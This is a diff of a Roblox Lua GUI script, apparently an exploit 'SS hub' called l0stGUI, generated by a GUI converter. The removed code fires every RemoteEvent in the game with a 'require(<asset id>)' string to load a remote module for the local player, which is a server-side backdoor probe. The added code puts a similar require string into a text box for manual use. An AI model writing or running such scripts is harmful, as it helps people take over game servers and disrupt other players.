@@ -7,7 +7,7 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 117 | Scripts: 29 | Modules: 0 | Tags: 0
+-- Instances: 113 | Scripts: 28 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.ScreenGui
@@ -629,9 +629,9 @@ G2L["46"]["TextScaled"] = true;
 G2L["46"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["46"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
 G2L["46"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["46"]["Size"] = UDim2.new(0, 63, 0, 51);
+G2L["46"]["Size"] = UDim2.new(0, 134, 0, 51);
 G2L["46"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["46"]["Text"] = [[execute l0stgui SS hub]];
+G2L["46"]["Text"] = [[execute l0stGUI]];
 G2L["46"]["Position"] = UDim2.new(0.36211, 0, 0.78378, 0);
 
 
@@ -1060,36 +1060,6 @@ G2L["70"] = Instance.new("UICorner", G2L["6d"]);
 G2L["71"] = Instance.new("UIStroke", G2L["6d"]);
 G2L["71"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 G2L["71"]["Thickness"] = 2;
-
-
--- StarterGui.ScreenGui.Frame.TextButton
-G2L["72"] = Instance.new("TextButton", G2L["4"]);
-G2L["72"]["TextWrapped"] = true;
-G2L["72"]["BorderSizePixel"] = 0;
-G2L["72"]["TextSize"] = 14;
-G2L["72"]["TextScaled"] = true;
-G2L["72"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["72"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
-G2L["72"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["72"]["Size"] = UDim2.new(0, 63, 0, 51);
-G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["72"]["Text"] = [[execute l0stGUI]];
-G2L["72"]["Position"] = UDim2.new(0.54197, 0, 0.78378, 0);
-
-
--- StarterGui.ScreenGui.Frame.TextButton.LocalScript
-G2L["73"] = Instance.new("LocalScript", G2L["72"]);
-
-
-
--- StarterGui.ScreenGui.Frame.TextButton.UICorner
-G2L["74"] = Instance.new("UICorner", G2L["72"]);
-
-
-
--- StarterGui.ScreenGui.Frame.TextButton.UIStroke
-G2L["75"] = Instance.new("UIStroke", G2L["72"]);
-G2L["75"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.LocalScript
@@ -1689,16 +1659,9 @@ task.spawn(C_43);
 -- StarterGui.ScreenGui.Frame.TextButton.LocalScript
 local function C_47()
 local script = G2L["47"];
-	local button = script.Parent
-	local username = game.Players.LocalPlayer.Name
-	
-	button.MouseButton1Click:Connect(function()
-		for _, obj in ipairs(game:GetDescendants()) do
-			if obj:IsA("RemoteEvent") then
-				local gui = 'require(116621687717356).load("' .. username .. '")'
-				obj:FireServer(gui)
-			end
-		end
+	script.Parent.MouseButton1Click:Connect(function()
+		local username = game.Players.LocalPlayer.Name
+		script.Parent.Parent:FindFirstChild("TextBox").Text = 'require(75026282232818).l0st("' .. username .. '")'
 	end)
 end;
 task.spawn(C_47);
@@ -1857,21 +1820,5 @@ local script = G2L["6f"];
 	end)
 end;
 task.spawn(C_6f);
--- StarterGui.ScreenGui.Frame.TextButton.LocalScript
-local function C_73()
-local script = G2L["73"];
-	local button = script.Parent
-	local username = game.Players.LocalPlayer.Name
-	
-	button.MouseButton1Click:Connect(function()
-		for _, obj in ipairs(game:GetDescendants()) do
-			if obj:IsA("RemoteEvent") then
-				local gui = 'require(75026282232818).l0st("' .. username .. '")'
-				obj:FireServer(gui)
-			end
-		end
-	end)
-end;
-task.spawn(C_73);
 
 return G2L["1"], require;
